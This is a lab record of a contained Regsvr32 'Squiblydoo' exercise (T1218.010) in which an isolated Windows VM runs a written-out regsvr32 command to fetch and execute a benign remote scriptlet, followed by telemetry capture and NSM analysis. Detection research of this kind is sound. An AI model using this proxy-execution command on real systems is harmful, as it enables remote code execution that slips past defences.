# Regsvr32 remote-scriptlet scenarios

## Scope

- **VM 100 — `kalivm` — `192.168.1.50` — attacker and scriptlet host.** Its
  Python HTTP server hosted the benign `benign.sct` payload on TCP 18081 and
  was bound only to the lab interface.
- **VM 104 — `WIN10-ANALYSIS` — `192.168.1.52` — target.** It ran
  `regsvr32.exe` as `NT AUTHORITY\SYSTEM`, retrieved the scriptlet, and wrote
  the local marker.
- **VM 106 — `nsm` — `10.9.0.20` (the only address recorded) — offline NSM.**
  It analyzed the captured traffic with Zeek and Suricata; it was not a run
  traffic destination.
- **Destinations.** The target contacted only
  `192.168.1.50:18081` on VM 100. The run used an IP literal and made no DNS
  query. Every run destination was inside `192.168.1.0/24`, nothing outside
  the lab was contacted, and VM 106's recorded `10.9.0.20` address was used
  for neither scriptlet hosting nor run traffic.
- **Hosting and references.** VM 100 hosted the only payload, the benign SCT;
  no stager or C2 was used. `regsvr32.exe` was the target's built-in Windows
  binary, so no external tool repository was contacted or cited for the run.
  The record does not state the account that ran the Kali HTTP service or the
  account used for offline NSM analysis.

`regsvr32.exe` is a Microsoft-signed registration utility. Loading the
`scrobj.dll` scriptlet component with an `/i:` URL lets the trusted binary
retrieve and execute script contained in a remote SCT file. This is the
classic Squiblydoo form of **System Binary Proxy Execution: Regsvr32
(T1218.010)**.

## Verified flow: remote benign SCT to marker

1. Kali VM 100 served a 412-byte benign SCT over lab-only HTTP from
   `192.168.1.50:18081`.
2. Windows VM 104 started from `win_verify_baseline` and began a full-packet
   pktmon capture.
3. The SYSTEM account invoked:

   ```text
   C:\Windows\System32\regsvr32.exe /s /n /u /i:http://192.168.1.50:18081/benign.sct scrobj.dll
   ```

4. The SCT used JScript and `WScript.Shell` only to launch `cmd.exe`, which
   wrote `C:\lab\regsvr32-marker.txt`. The marker contained
   `benign-regsvr32-marker`.
5. Endpoint telemetry and the packet capture were collected, the capture was
   analyzed offline by Zeek and Suricata on NSM VM 106, Kali staging was
   removed, and VM 104 was rolled back.

The scriptlet action succeeded even though `regsvr32.exe` returned exit code 5
after taking the `/u` unregister path; the exact cause of that final code was
not separately diagnosed. The marker, child process, cached SCT, endpoint
connection, and decoded HTTP response independently prove execution.

## Other scenarios considered

- A local SCT supplied to `/i:` would isolate proxy execution from network
  delivery but would lose the HTTP and INetCache signals.
- A remote SCT that writes a file directly through `Scripting.FileSystemObject`
  would avoid the child process and help compare direct file attribution.
- A scriptlet fetched through an HTTPS reverse proxy could add TLS
  fingerprint, certificate, and SNI observations.
- A user-context run could compare per-user INetCache and registry paths with
  the SYSTEM-profile paths observed here.

These variants should remain separate runs so their network and parent-child
profiles are not conflated with this verified flow.
